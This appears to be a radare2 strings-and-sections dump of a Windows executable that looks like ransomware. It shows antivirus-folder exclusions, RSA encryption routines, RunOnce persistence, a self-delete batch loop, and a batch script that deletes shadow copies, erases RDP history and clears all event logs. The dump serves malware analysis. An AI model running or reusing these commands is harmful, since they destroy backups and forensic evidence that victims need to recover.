Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0x12800 0x00401000  0x13000 -r-x .text
1   0x00012c00   0x5c00 0x00414000   0x6000 -r-- .rdata
2   0x00018800   0x1400 0x0041a000   0xb000 -rw- .data
3   0x00019c00   0x3000 0x00425000   0x3000 -r-- .rsrc

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00401f6f paddr=0x0000136f haddr=0x00000120 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Main]
vaddr=0x00411f5f paddr=0x0001135f
[Imports]
nth vaddr      bind type lib          name
492 0x000171ec 0x004185ec 7   8    .rdata  ascii   SHA-224
493 0x00017200 0x00418600 9   10   .rdata  ascii   id-sha256
494 0x0001720c 0x0041860c 7   8    .rdata  ascii   SHA-256
495 0x00017214 0x00418614 6   7    .rdata  ascii   010001
496 0x0001721c 0x0041861c 7   8    .rdata  ascii   windows
497 0x00017224 0x00418624 9   10   .rdata  ascii   Microsoft
498 0x00017230 0x00418630 14  15   .rdata  ascii   Microsoft Help
499 0x00017240 0x00418640 29  30   .rdata  ascii   Windows App Certification Kit
500 0x00017260 0x00418660 16  17   .rdata  ascii   Windows Defender
501 0x00017274 0x00418674 4   5    .rdata  ascii   ESET
502 0x0001727c 0x0041867c 6   7    .rdata  ascii   COMODO
503 0x00017284 0x00418684 10  11   .rdata  ascii   Windows NT
504 0x00017290 0x00418690 12  13   .rdata  ascii   Windows Kits
505 0x000172a0 0x004186a0 12  13   .rdata  ascii   Windows Mail
506 0x000172b0 0x004186b0 20  21   .rdata  ascii   Windows Media Player
507 0x000172c8 0x004186c8 27  28   .rdata  ascii   Windows Multimedia Platform
508 0x000172e4 0x004186e4 18  19   .rdata  ascii   Windows Phone Kits
509 0x000172f8 0x004186f8 30  31   .rdata  ascii   Windows Phone Silverlight Kits
510 0x00017318 0x00418718 20  21   .rdata  ascii   Windows Photo Viewer
511 0x00017330 0x00418730 24  25   .rdata  ascii   Windows Portable Devices
512 0x0001734c 0x0041874c 15  16   .rdata  ascii   Windows Sidebar
513 0x0001735c 0x0041875c 17  18   .rdata  ascii   WindowsPowerShell
514 0x00017370 0x00418770 4   5    .rdata  ascii   Temp
515 0x00017378 0x00418778 18  19   .rdata  ascii   NVIDIA Corporation
516 0x0001738c 0x0041878c 13  14   .rdata  ascii   Microsoft.NET
517 0x0001739c 0x0041879c 17  18   .rdata  ascii   Internet Explorer
518 0x000173b0 0x004187b0 13  14   .rdata  ascii   Kaspersky Lab
519 0x000173c0 0x004187c0 6   7    .rdata  ascii   McAfee
520 0x000173c8 0x004187c8 5   6    .rdata  ascii   Avira
521 0x000173d0 0x004187d0 16  17   .rdata  ascii   spytech software
522 0x000173e4 0x004187e4 9   10   .rdata  ascii   sysconfig
523 0x000173f0 0x004187f0 5   6    .rdata  ascii   Avast
524 0x000173f8 0x004187f8 6   7    .rdata  ascii   Dr.Web
525 0x00017400 0x00418800 8   9    .rdata  ascii   Symantec
526 0x0001740c 0x0041880c 24  25   .rdata  ascii   Symantec_Client_Security
527 0x00017428 0x00418828 25  26   .rdata  ascii   system volume information
528 0x00017448 0x00418848 16  17   .rdata  ascii   Microsoft Shared
529 0x0001745c 0x0041885c 12  13   .rdata  ascii   Common Files
530 0x0001746c 0x0041886c 15  16   .rdata  ascii   Outlook Express
531 0x0001747c 0x0041887c 11  12   .rdata  ascii   Movie Maker
532 0x00017488 0x00418888 6   7    .rdata  ascii   Chrome
533 0x00017490 0x00418890 15  16   .rdata  ascii   Mozilla Firefox
534 0x000174a0 0x004188a0 5   6    .rdata  ascii   Opera
535 0x000174a8 0x004188a8 13  14   .rdata  ascii   YandexBrowser
536 0x000174b8 0x004188b8 5   6    .rdata  ascii   ntldr
537 0x000174c0 0x004188c0 4   5    .rdata  ascii   wsus
538 0x000174c8 0x004188c8 4   5    .rdata  ascii   Wsus
539 0x000174d0 0x004188d0 11  12   .rdata  ascii   ProgramData
540 0x000174e0 0x004188e0 445 446  .rdata  ascii   @echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
541 0x000176a0 0x00418aa0 5   12   .rdata  utf16le __tmp
542 0x000176ac 0x00418aac 4   10   .rdata  utf16le .bat
543 0x000176b8 0x00418ab8 14  30   .rdata  utf16le :Repeat\r\ndel "
544 0x000176d8 0x00418ad8 13  28   .rdata  utf16le "\r\nif exist "
545 0x000176f4 0x00418af4 20  42   .rdata  utf16le " goto Repeat\r\ndel "
546 0x00017728 0x00418b28 4   20   .rdata  utf32le p\*.
547 0x00017750 0x00418b50 49  100  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\RunOnce
548 0x000177b4 0x00418bb4 17  36   .rdata  utf16le CertificatesCheck
549 0x000177dc 0x00418bdc 7   8    .rdata  ascii   outlook
550 0x000177e4 0x00418be4 4   5    .rdata  ascii   ssms
551 0x000177ec 0x00418bec 7   8    .rdata  ascii   postgre
552 0x000177f8 0x00418bf8 5   6    .rdata  ascii   excel
553 0x00017800 0x00418c00 4   5    .rdata  ascii   word
554 0x00017808 0x00418c08 4   10   .rdata  utf16le temp
555 0x00017814 0x00418c14 5   12   .rdata  utf16le KDATA
556 0x00017820 0x00418c20 46  94   .rdata  utf16le \Microsoft\SystemCertificates\My\Certificates\
557 0x00017880 0x00418c80 7   16   .rdata  utf16le appdata
558 0x00017890 0x00418c90 5   12   .rdata  utf16le .html
559 0x000178a0 0x00418ca0 6   14   .rdata  utf16le EXDATA
560 0x000178b0 0x00418cb0 6   14   .rdata  utf16le CODATA
561 0x000178c0 0x00418cc0 11  12   .rdata  ascii   rsa_encrypt
562 0x000178cc 0x00418ccc 10  11   .rdata  ascii   rsa_genkey
563 0x00017e4e 0x0041924e 9   10   .rdata  ascii   HeapAlloc
564 0x00017e5a 0x0041925a 12  13   .rdata  ascii   LoadLibraryW
565 0x00017e6a 0x0041926a 10  11   .rdata  ascii   HeapCreate
566 0x00017e78 0x00419278 14  15   .rdata  ascii   CreateProcessA
567 0x00017e8a 0x0041928a 14  15   .rdata  ascii   GetProcAddress
568 0x00017e9c 0x0041929c 11  12   .rdata  ascii   CloseHandle
569 0x00017eaa 0x004192aa 8   9    .rdata  ascii   lstrlenA
570 0x00017eb6 0x004192b6 16  17   .rdata  ascii   SetFilePointerEx
571 0x00017eca 0x004192ca 9   10   .rdata  ascii   WriteFile
572 0x00017ed6 0x004192d6 19  20   .rdata  ascii   WideCharToMultiByte
573 0x00017eec 0x004192ec 8   9    .rdata  ascii   ReadFile
574 0x00017ef8 0x004192f8 11  12   .rdata  ascii   CreateFileW
575 0x00017f06 0x00419306 13  14   .rdata  ascii   GetFileSizeEx
576 0x00017f16 0x00419316 12  13   .rdata  ascii   GetLastError
577 0x00017f26 0x00419326 11  12   .rdata  ascii   ExitProcess
578 0x00017f34 0x00419334 23  24   .rdata  ascii   GetEnvironmentVariableW
579 0x00017f4e 0x0041934e 16  17   .rdata  ascii   GetTempFileNameW
580 0x00017f62 0x00419362 14  15   .rdata  ascii   FindFirstFileW
581 0x00017f74 0x00419374 14  15   .rdata  ascii   SetFilePointer
582 0x00017f86 0x00419386 12  13   .rdata  ascii   FreeResource
583 0x00017f96 0x00419396 9   10   .rdata  ascii   lstrcpynA
584 0x00017fa2 0x004193a2 13  14   .rdata  ascii   FindResourceW
585 0x00017fb2 0x004193b2 12  13   .rdata  ascii   LoadResource
586 0x00017fc2 0x004193c2 14  15   .rdata  ascii   CreateProcessW
587 0x00017fd4 0x004193d4 11  12   .rdata  ascii   MoveFileExW
588 0x00017fe2 0x004193e2 8   9    .rdata  ascii   HeapFree
589 0x00017fee 0x004193ee 16  17   .rdata  ascii   GetLogicalDrives
590 0x00018002 0x00419402 23  24   .rdata  ascii   SetThreadExecutionState
591 0x0001801c 0x0041941c 14  15   .rdata  ascii   GetProcessHeap
592 0x0001802e 0x0041942e 13  14   .rdata  ascii   GetDriveTypeA
593 0x0001803e 0x0041943e 9   10   .rdata  ascii   CopyFileW
594 0x0001804a 0x0041944a 14  15   .rdata  ascii   SizeofResource
595 0x0001805c 0x0041945c 11  12   .rdata  ascii   HeapDestroy
596 0x0001806a 0x0041946a 18  19   .rdata  ascii   GetFileAttributesW
597 0x00018080 0x00419480 18  19   .rdata  ascii   GetModuleFileNameW
598 0x00018096 0x00419496 19  20   .rdata  ascii   MultiByteToWideChar
599 0x000180ac 0x004194ac 8   9    .rdata  ascii   lstrlenW
600 0x000180b8 0x004194b8 12  13   .rdata  ascii   GetStdHandle
601 0x000180c8 0x004194c8 9   10   .rdata  ascii   lstrcmpiA
602 0x000180d4 0x004194d4 9   10   .rdata  ascii   FindClose
603 0x000180e0 0x004194e0 10  11   .rdata  ascii   LocalAlloc
604 0x000180ee 0x004194ee 12  13   .rdata  ascii   LockResource
605 0x000180fe 0x004194fe 9   10   .rdata  ascii   lstrcmpiW
606 0x0001810a 0x0041950a 8   9    .rdata  ascii   lstrcatW
607 0x00018116 0x00419516 13  14   .rdata  ascii   FindNextFileW
608 0x00018126 0x00419526 14  15   .rdata  ascii   CompareStringA
609 0x00018138 0x00419538 9   10   .rdata  ascii   LocalFree
610 0x00018144 0x00419544 18  19   .rdata  ascii   SetFileAttributesW
611 0x0001815a 0x0041955a 8   9    .rdata  ascii   lstrcpyW
612 0x00018166 0x00419566 8   9    .rdata  ascii   lstrcpyA
613 0x00018170 0x00419570 12  13   .rdata  ascii   KERNEL32.dll
614 0x00018180 0x00419580 20  21   .rdata  ascii   CryptAcquireContextW
615 0x00018198 0x00419598 19  20   .rdata  ascii   CryptReleaseContext
616 0x000181ae 0x004195ae 14  15   .rdata  ascii   CryptGenRandom
617 0x000181c0 0x004195c0 15  16   .rdata  ascii   RegCreateKeyExW
618 0x000181d2 0x004195d2 16  17   .rdata  ascii   RegQueryValueExW
619 0x000181e6 0x004195e6 13  14   .rdata  ascii   RegOpenKeyExW
620 0x000181f6 0x004195f6 20  21   .rdata  ascii   GetCurrentHwProfileW
621 0x0001820e 0x0041960e 11  12   .rdata  ascii   RegCloseKey
622 0x0001821c 0x0041961c 14  15   .rdata  ascii   RegSetValueExW
623 0x0001822c 0x0041962c 12  13   .rdata  ascii   ADVAPI32.dll
624 0x0001823c 0x0041963c 15  16   .rdata  ascii   StringFromGUID2
625 0x0001824e 0x0041964e 12  13   .rdata  ascii   CoCreateGuid
626 0x0001825c 0x0041965c 9   10   .rdata  ascii   ole32.dll
627 0x00018268 0x00419668 17  18   .rdata  ascii   PathFindFileNameW
628 0x0001827c 0x0041967c 19  20   .rdata  ascii   PathRemoveFileSpecW
629 0x00018290 0x00419690 11  12   .rdata  ascii   SHLWAPI.dll
630 0x0001829e 0x0041969e 15  16   .rdata  ascii   GetCommandLineA
631 0x000182b0 0x004196b0 25  26   .rdata  ascii   IsProcessorFeaturePresent
632 0x000182cc 0x004196cc 17  18   .rdata  ascii   IsDebuggerPresent
633 0x000182e0 0x004196e0 13  14   .rdata  ascii   EncodePointer
634 0x000182f0 0x004196f0 13  14   .rdata  ascii   DecodePointer
635 0x00018300 0x00419700 20  21   .rdata  ascii   EnterCriticalSection
636 0x00018318 0x00419718 20  21   .rdata  ascii   LeaveCriticalSection
637 0x00018330 0x00419730 11  12   .rdata  ascii   GetFileType
638 0x0001833e 0x0041973e 21  22   .rdata  ascii   DeleteCriticalSection
639 0x00018356 0x00419756 15  16   .rdata  ascii   GetStartupInfoW
640 0x00018368 0x00419768 12  13   .rdata  ascii   GetConsoleCP
641 0x00018378 0x00419778 14  15   .rdata  ascii   GetConsoleMode
642 0x0001838a 0x0041978a 9   10   .rdata  ascii   RtlUnwind
643 0x00018396 0x00419796 12  13   .rdata  ascii   SetLastError
644 0x000183a6 0x004197a6 18  19   .rdata  ascii   GetCurrentThreadId
645 0x000183bc 0x004197bc 18  19   .rdata  ascii   GetModuleHandleExW
646 0x000183d2 0x004197d2 18  19   .rdata  ascii   GetModuleFileNameA
647 0x000183e8 0x004197e8 23  24   .rdata  ascii   QueryPerformanceCounter
648 0x00018402 0x00419802 19  20   .rdata  ascii   GetCurrentProcessId
649 0x00018418 0x00419818 23  24   .rdata  ascii   GetSystemTimeAsFileTime
650 0x00018432 0x00419832 22  23   .rdata  ascii   GetEnvironmentStringsW
651 0x0001844c 0x0041984c 23  24   .rdata  ascii   FreeEnvironmentStringsW
652 0x00018466 0x00419866 24  25   .rdata  ascii   UnhandledExceptionFilter
653 0x00018482 0x00419882 27  28   .rdata  ascii   SetUnhandledExceptionFilter
654 0x000184a0 0x004198a0 37  38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
655 0x000184c8 0x004198c8 5   6    .rdata  ascii   Sleep
656 0x000184d0 0x004198d0 17  18   .rdata  ascii   GetCurrentProcess
657 0x000184e4 0x004198e4 16  17   .rdata  ascii   TerminateProcess
658 0x000184f8 0x004198f8 8   9    .rdata  ascii   TlsAlloc
659 0x00018504 0x00419904 11  12   .rdata  ascii   TlsGetValue
660 0x00018512 0x00419912 11  12   .rdata  ascii   TlsSetValue
661 0x00018520 0x00419920 7   8    .rdata  ascii   TlsFree
662 0x0001852a 0x0041992a 16  17   .rdata  ascii   GetModuleHandleW
663 0x0001853e 0x0041993e 12  13   .rdata  ascii   SetStdHandle
664 0x0001854e 0x0041994e 13  14   .rdata  ascii   WriteConsoleW
665 0x0001855e 0x0041995e 16  17   .rdata  ascii   FlushFileBuffers
666 0x00018572 0x00419972 15  16   .rdata  ascii   IsValidCodePage
667 0x00018584 0x00419984 6   7    .rdata  ascii   GetACP
668 0x0001858e 0x0041998e 8   9    .rdata  ascii   GetOEMCP
669 0x0001859a 0x0041999a 9   10   .rdata  ascii   GetCPInfo
670 0x000185a6 0x004199a6 14  15   .rdata  ascii   LoadLibraryExW
671 0x000185b8 0x004199b8 18  19   .rdata  ascii   OutputDebugStringW
672 0x000185ce 0x004199ce 11  12   .rdata  ascii   HeapReAlloc
673 0x000185dc 0x004199dc 14  15   .rdata  ascii   GetStringTypeW
674 0x000185ee 0x004199ee 8   9    .rdata  ascii   HeapSize
675 0x000185fa 0x004199fa 12  13   .rdata  ascii   LCMapStringW
0   0x00018834 0x0041a034 12  52   .data   utf32le \t\a\f\b\f\t\f\n\a\v\b\f
1   0x000188b8 0x0041a0b8 5   24   .data   utf32le R\rS\rW
2   0x000188d0 0x0041a0d0 7   32   .data   utf32le Y\vl\rm p
3   0x00018944 0x0041a144 4   20   .data   utf32le \v§\r· blocks=Basic Latin,Latin-1 Supplement
4   0x00018ef2 0x0041a6f2 26  27   .data   ascii                             
5   0x00018fd9 0x0041a7d9 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
6   0x00018ff9 0x0041a7f9 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
7   0x00019112 0x0041a912 26  27   .data   ascii                             
8   0x000191f2 0x0041a9f2 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
9   0x00019212 0x0041aa12 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
10  0x000196a0 0x0041aea0 4   20   .data   utf32le 5\v@Ͽ blocks=Basic Latin,Greek and Coptic
11  0x0001978a 0x0041af8a 4   5    .data   ascii   kU'9
12  0x000197da 0x0041afda 8   11   .data   utf8    HMXB䧓9;5 blocks=Basic Latin,CJK Unified Ideographs Extension A
13  0x00019814 0x0041b014 5   8    .data   utf8    ]݀nLɛ blocks=Basic Latin,Syriac,IPA Extensions
14  0x00019833 0x0041b033 9   12   .data   utf8    ?q=\nףp=\nף blocks=Basic Latin,Hebrew
15  0x0001983f 0x0041b03f 4   5    .data   ascii   ?Zd;
16  0x00019887 0x0041b087 4   5    .data   ascii   ?/L[
17  0x00019896 0x0041b096 4   5    .data   ascii   S;uD
18  0x000198a9 0x0041b0a9 4   6    .data   utf8    ϔ?$# blocks=Greek and Coptic,Basic Latin
19  0x000198af 0x0041b0af 4   7    .data   utf8    ⼺;1a blocks=Kangxi Radicals,Basic Latin
20  0x000198b6 0x0041b0b6 5   6    .data   ascii   z?aUY
21  0x000198ce 0x0041b0ce 4   5    .data   ascii   D?$?
22  0x000198e6 0x0041b0e6 4   5    .data   ascii   U>c{
23  0x000198f8 0x0041b0f8 8   10   .data   utf8    zc%C1,<!
24  0x0001990b 0x0041b10b 5   7    .data   utf8    ;܈X\b\e blocks=Basic Latin,Syriac
25  0x00019917 0x0041b117 5   7    .data   utf8    ;ƄEB\a blocks=Basic Latin,Latin Extended-B
26  0x00019922 0x0041b122 4   5    .data   ascii   .:3q
27  0x0001994b 0x0041b14b 5   6    .data   ascii   -64OS
28  0x0001996c 0x0041b16c 4   5    .data   ascii   NKeb
0   0x00019e3a 0x0042523a 6   14   .rsrc   utf16le CODATA
1   0x00019e48 0x00425248 5   12   .rsrc   utf16le DDATA
2   0x00019e54 0x00425254 6   14   .rsrc   utf16le EXDATA
3   0x00019e62 0x00425262 5   11   .rsrc   utf16le KDATA
4   0x00019f04 0x00425304 4   5    .rsrc   ascii   c)EK
5   0x00019f09 0x00425309 4   5    .rsrc   ascii   ~\t3$
6   0x00019f18 0x00425318 6   8    .rsrc   utf8    ||H,eӑ blocks=Basic Latin,Cyrillic
7   0x00019f8d 0x0042538d 6   7    .rsrc   ascii   z|pt(k
8   0x00019fdf 0x004253df 4   5    .rsrc   ascii   o1\b0
9   0x0001a0c3 0x004254c3 4   5    .rsrc   ascii   ;x}N
10  0x0001a0d7 0x004254d7 5   6    .rsrc   ascii   Oh4S[
11  0x0001a145 0x00425545 5   6    .rsrc   ascii   986s\b
12  0x0001a167 0x00425567 4   5    .rsrc   ascii   M~a\f
13  0x0001a1b2 0x004255b2 4   5    .rsrc   ascii   'y@Z
14  0x0001a22b 0x0042562b 5   6    .rsrc   ascii   =~w(0
15  0x0001a293 0x00425693 4   5    .rsrc   ascii   M4S"
16  0x0001a2a3 0x004256a3 4   5    .rsrc   ascii   PhcS
17  0x0001a2de 0x004256de 5   6    .rsrc   ascii   ]AORL
18  0x0001a2f0 0x004256f0 7   10   .rsrc   utf8    7d-٥ӐI2 blocks=Basic Latin,Arabic,Cyrillic
19  0x0001a31b 0x0042571b 4   7    .rsrc   utf8    x@Ȧу blocks=Basic Latin,Latin Extended-B,Cyrillic
20  0x0001a33b 0x0042573b 5   6    .rsrc   ascii   MpAA{
21  0x0001a36f 0x0042576f 4   7    .rsrc   utf8    $㕖&o blocks=Basic Latin,CJK Unified Ideographs Extension A
22  0x0001a377 0x00425777 4   5    .rsrc   ascii   .r*|
23  0x0001a386 0x00425786 4   6    .rsrc   utf8    [dڎ& blocks=Basic Latin,Arabic
24  0x0001a398 0x00425798 6   7    .rsrc   ascii   ro\tE=P
25  0x0001a3b5 0x004257b5 4   5    .rsrc   ascii   DE,(
26  0x0001a3c5 0x004257c5 5   8    .rsrc   utf8    6!!\e blocks=Private Use Area,Basic Latin
27  0x0001a3d4 0x004257d4 4   7    .rsrc   utf8    枴=hc blocks=CJK Unified Ideographs,Basic Latin
28  0x0001a3e2 0x004257e2 4   5    .rsrc   ascii   C{(!
29  0x0001a475 0x00425875 4   6    .rsrc   utf8    ʂk3\n blocks=IPA Extensions,Basic Latin
30  0x0001a4b8 0x004258b8 4   5    .rsrc   ascii   9nNM
31  0x0001a503 0x00425903 8   10   .rsrc   utf8    ڣg-;{+0[ blocks=Arabic,Basic Latin
32  0x0001a528 0x00425928 5   8    .rsrc   utf8    $\v?L blocks=Basic Latin,Private Use Area
33  0x0001a538 0x00425938 12  16   .rsrc   utf8    |D@ٗ}p/ɲZ0); blocks=Basic Latin,Arabic,IPA Extensions
34  0x0001a54c 0x0042594c 5   6    .rsrc   ascii   c5\n_l
35  0x0001a552 0x00425952 5   7    .rsrc   utf8    &X<æ> blocks=Basic Latin,Latin-1 Supplement
36  0x0001a59f 0x0042599f 4   5    .rsrc   ascii   <9*q
37  0x0001a5aa 0x004259aa 4   5    .rsrc   ascii   rI"\e
38  0x0001a5d0 0x004259d0 4   5    .rsrc   ascii   EG`\t
39  0x0001a623 0x00425a23 5   6    .rsrc   ascii   Sx(e 
40  0x0001a63d 0x00425a3d 4   6    .rsrc   utf8    C\rSϯ blocks=Basic Latin,Greek and Coptic
41  0x0001a643 0x00425a43 4   5    .rsrc   ascii   $`3k
42  0x0001a68f 0x00425a8f 4   5    .rsrc   ascii   Z1$o
43  0x0001a6a1 0x00425aa1 4   6    .rsrc   utf8    \n%Kͽ blocks=Basic Latin,Greek and Coptic
44  0x0001a6cc 0x00425acc 5   6    .rsrc   ascii   \r\eho\a
45  0x0001a777 0x00425b77 4   5    .rsrc   ascii   #\r2}
46  0x0001a781 0x00425b81 5   7    .rsrc   utf8    ~!@È' blocks=Basic Latin,Latin-1 Supplement
47  0x0001a7d1 0x00425bd1 5   7    .rsrc   utf8    4sPՕ\a blocks=Basic Latin,Armenian
48  0x0001a7dd 0x00425bdd 4   6    .rsrc   utf8    r͛X! blocks=Basic Latin,Combining Diacritical Marks
49  0x0001a7f5 0x00425bf5 8   10   .rsrc   utf8    Θp|oF#s# blocks=Greek and Coptic,Basic Latin
50  0x0001a808 0x00425c08 4   5    .rsrc   ascii   Pb!l
51  0x0001a829 0x00425c29 5   8    .rsrc   utf8    \EҾcƑ blocks=Basic Latin,Cyrillic,Latin Extended-B
52  0x0001a858 0x00425c58 4   5    .rsrc   ascii   /\tX&
53  0x0001a85f 0x00425c5f 4   5    .rsrc   ascii   qLW&
54  0x0001a8ca 0x00425cca 4   5    .rsrc   ascii   @<Yj
55  0x0001a8cf 0x00425ccf 6   7    .rsrc   ascii   ?DYe(k
56  0x0001a90b 0x00425d0b 4   5    .rsrc   ascii   ]*aT
57  0x0001a947 0x00425d47 4   5    .rsrc   ascii   ?*L+
58  0x0001a94d 0x00425d4d 6   8    .rsrc   utf8    T<0lМE blocks=Basic Latin,Cyrillic
59  0x0001a95b 0x00425d5b 4   5    .rsrc   ascii   #Vn/
60  0x0001a96b 0x00425d6b 4   6    .rsrc   utf8    1Ժ`p blocks=Basic Latin,Armenian
61  0x0001a978 0x00425d78 6   8    .rsrc   utf8    kג;m|% blocks=Basic Latin,Hebrew
62  0x0001a98b 0x00425d8b 4   5    .rsrc   ascii   >|2\v
63  0x0001a9ac 0x00425dac 4   5    .rsrc   ascii   ^75r
64  0x0001a9e4 0x00425de4 4   5    .rsrc   ascii   NV8Z
65  0x0001aa3b 0x00425e3b 4   6    .rsrc   utf8    J ژ- blocks=Basic Latin,Arabic
66  0x0001aa4a 0x00425e4a 4   5    .rsrc   ascii   `]T(
67  0x0001aa51 0x00425e51 4   5    .rsrc   ascii   ^\feU
68  0x0001aa61 0x00425e61 4   5    .rsrc   ascii   8%~~
69  0x0001aa82 0x00425e82 4   6    .rsrc   utf8    \v,ޟC blocks=Basic Latin,Thaana
70  0x0001aa98 0x00425e98 4   5    .rsrc   ascii   Squq
71  0x0001aaa0 0x00425ea0 5   7    .rsrc   utf8    Ұz+?2 blocks=Cyrillic,Basic Latin
72  0x0001aaa7 0x00425ea7 4   5    .rsrc   ascii   L[OA
73  0x0001ab08 0x00425f08 4   5    .rsrc   ascii   .sLJ
74  0x0001ab41 0x00425f41 5   6    .rsrc   ascii   %TfP;
75  0x0001ab85 0x00425f85 5   6    .rsrc   ascii   l>be{
76  0x0001abb3 0x00425fb3 4   5    .rsrc   ascii   ,C>s
77  0x0001aca9 0x004260a9 4   5    .rsrc   ascii   zjc4
78  0x0001acdb 0x004260db 7   8    .rsrc   ascii   D8?w_xJ
79  0x0001ad45 0x00426145 5   6    .rsrc   ascii   tGPE\
80  0x0001ad81 0x00426181 4   5    .rsrc   ascii   \e7`X
81  0x0001adc5 0x004261c5 4   5    .rsrc   ascii   2\v/\b
82  0x0001ade0 0x004261e0 4   6    .rsrc   utf8    \e,CԘ blocks=Basic Latin,Cyrillic Supplement
83  0x0001adf9 0x004261f9 5   7    .rsrc   utf8    ,V(Rȥ blocks=Basic Latin,Latin Extended-B
84  0x0001ae3f 0x0042623f 4   5    .rsrc   ascii   B\tA3
85  0x0001af88 0x00426388 4   5    .rsrc   ascii   z)XK
86  0x0001afe2 0x004263e2 4   5    .rsrc   ascii   SYWv
87  0x0001aff3 0x004263f3 5   7    .rsrc   utf8    6/'ż_ blocks=Basic Latin,Latin Extended-A
88  0x0001affc 0x004263fc 4   5    .rsrc   ascii   0wG|
89  0x0001b011 0x00426411 6   7    .rsrc   ascii   z9p,(?
90  0x0001b03e 0x0042643e 4   6    .rsrc   utf8    pa?݈ blocks=Basic Latin,Syriac
91  0x0001b063 0x00426463 4   5    .rsrc   ascii   o*\b0
92  0x0001b13b 0x0042653b 5   6    .rsrc   ascii   aV\b\v/
93  0x0001b159 0x00426559 5   6    .rsrc   ascii   nNO;4
94  0x0001b1e9 0x004265e9 6   7    .rsrc   ascii   SHMIa&
95  0x0001b236 0x00426636 4   5    .rsrc   ascii   hy,Z
96  0x0001b266 0x00426666 4   6    .rsrc   utf8    ~l˂\e blocks=Basic Latin,Spacing Modifier Letters
97  0x0001b2af 0x004266af 5   6    .rsrc   ascii   =dw(0
98  0x0001b327 0x00426727 4   5    .rsrc   ascii   PBc]
99  0x0001b362 0x00426762 4   5    .rsrc   ascii   ^A^R
100 0x0001b3b1 0x004267b1 4   5    .rsrc   ascii   J\f=X
101 0x0001b3ce 0x004267ce 5   7    .rsrc   utf8    @WEͳ\b blocks=Basic Latin,Greek and Coptic
102 0x0001b3fb 0x004267fb 4   5    .rsrc   ascii   .&*9
103 0x0001b40a 0x0042680a 4   6    .rsrc   utf8    [dڎ& blocks=Basic Latin,Arabic
104 0x0001b44a 0x0042684a 8   11   .rsrc   utf8    ݕ}!:\e8zĸ blocks=Arabic Supplement,Basic Latin,Latin Extended-A
105 0x0001b458 0x00426858 4   7    .rsrc   utf8    枴=kc blocks=CJK Unified Ideographs,Basic Latin
106 0x0001b466 0x00426866 4   5    .rsrc   ascii   K{ !
107 0x0001b476 0x00426876 4   5    .rsrc   ascii   Z\r-c
108 0x0001b4f9 0x004268f9 4   6    .rsrc   utf8    ʐk8\n blocks=IPA Extensions,Basic Latin
109 0x0001b513 0x00426913 4   5    .rsrc   ascii   #n@Z
110 0x0001b53c 0x0042693c 7   8    .rsrc   ascii   in@M\aie
111 0x0001b589 0x00426989 9   10   .rsrc   ascii   gk;c+6[\nM
112 0x0001b5c2 0x004269c2 8   10   .rsrc   utf8    rpmɯZo)T blocks=Basic Latin,IPA Extensions
113 0x0001b5d0 0x004269d0 5   6    .rsrc   ascii   I5\n_l
114 0x0001b5db 0x004269db 7   8    .rsrc   ascii   >]^A\t!K
115 0x0001b62e 0x00426a2e 4   5    .rsrc   ascii   |I-\e
116 0x0001b654 0x00426a54 4   5    .rsrc   ascii   XGb\t
117 0x0001b69b 0x00426a9b 4   6    .rsrc   utf8    Ǒr?# blocks=Latin Extended-B,Basic Latin
118 0x0001b6a7 0x00426aa7 5   6    .rsrc   ascii   So(6 
119 0x0001b6c7 0x00426ac7 4   5    .rsrc   ascii   $J3k
120 0x0001b713 0x00426b13 4   5    .rsrc   ascii   Z=$w
121 0x0001b71b 0x00426b1b 4   6    .rsrc   utf8    [G{ִ blocks=Basic Latin,Hebrew
